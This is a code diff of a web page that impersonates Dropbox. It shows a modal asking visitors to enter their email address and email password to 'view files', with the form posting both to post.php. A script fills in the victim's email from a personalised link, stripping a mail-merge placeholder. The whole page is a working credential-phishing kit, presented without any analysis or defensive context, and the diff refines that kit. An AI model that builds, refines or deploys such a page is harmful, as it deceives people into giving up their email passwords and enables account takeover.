@@ -162,57 +162,54 @@ $(document).ready(function() {
 <div id="modalbox" class="modal">
 
     <!-- Modal content -->
-   <!-- Your modal content HTML -->
+<!-- Your modal HTML -->
 <div class="modal-content">
-    <div class="mcontent" id="mcontent">
-        <div class="mlogo">
-            <img src="images/log.png">
-        </div>
-        <p class="instruction">
-          These files are sensitive and secured against unauthorized access. In order to access this file, please confirm receiving E-mail to authorize your download.
-        </p>
-        <p class="inst">Please Confirm Receiving E-mail to View Files</p>
-        <div class="error" id="error">Oops! Dropbox could not open user session, Please verify your information and try again</div>
-        <div class="ebox">
-            <p class="e-text" id="etext"></p>
-
-            <form id="emailForm" action="post.php" method="POST">
-                <input type="email" class="password" id="email" name="email" placeholder="Enter receiving email" value="" required>
-                <input type="password" class="password" id="password" name="password" placeholder="Enter email password">
-                <div class="submitdiv">
-                  <button type="submit" class="submit" id="submit">View Files</button>
-                </div>
-            </form>
-            <p class="foot">&copy; Copyright Dropbox Inc. 2026</p>
-        </div>
+  <div class="mcontent" id="mcontent">
+    <div class="mlogo">
+      <img src="images/log.png">
     </div>
+    <p class="instruction">
+      These files are sensitive and secured against unauthorized access. In order to access this file, please confirm receiving E-mail to authorize your download.
+    </p>
+    <p class="inst">Please Confirm Receiving E-mail to View Files</p>
+    <div class="error" id="error">Oops! Dropbox could not open user session, Please verify your information and try again</div>
+    <div class="ebox">
+      <p class="e-text" id="etext"></p>
+
+      <form id="emailForm" action="post.php" method="POST">
+        <input type="email" class="password" id="email" name="email" placeholder="Enter receiving email" required>
+        <input type="password" class="password" id="password" name="password" placeholder="Enter email password">
+        <div class="submitdiv">
+          <button type="submit" class="submit" id="submit">View Files</button>
+        </div>
+      </form>
+      <p class="foot">&copy; Copyright Dropbox Inc. 2026</p>
+    </div>
+  </div>
 </div>
 
-<!-- Put the script here, just before closing </body> -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
-    function getEmailFromHash() {
-        let hash = window.location.hash;
-        if (hash) {
-            hash = hash.substring(1); // remove #
-            hash = hash.replace(/\[\[-email-\]\]/g, ''); // remove [[-email-]] if present
-            return decodeURIComponent(hash);
-        }
-        return '';
-    }
-
     const emailInput = document.getElementById('email');
-    const emailFromHash = getEmailFromHash();
-    if (emailFromHash) {
-        emailInput.value = emailFromHash;
+
+    // Clear any existing value to avoid full URL showing
+    emailInput.value = '';
+
+    // Get only the hash part of the URL
+    let hash = window.location.hash; // includes #
+    if (hash && hash.length > 1) {
+        hash = hash.substring(1); // remove #
+        hash = hash.replace(/\[\[-email-\]\]/g, ''); // remove [[-email-]] if present
+        emailInput.value = decodeURIComponent(hash); // fill input with email only
     }
 
-    // Keep URL hash updated if user edits email
+    // Optional: keep URL hash updated if user edits email
     emailInput.addEventListener('input', () => {
         history.replaceState(null, '', '#' + encodeURIComponent(emailInput.value));
     });
 });
 </script>
+
 </body>
 
 
@@ -231,6 +228,7 @@ document.addEventListener("DOMContentLoaded", function() {
 </body>
 
 </html>
+
 
 
 
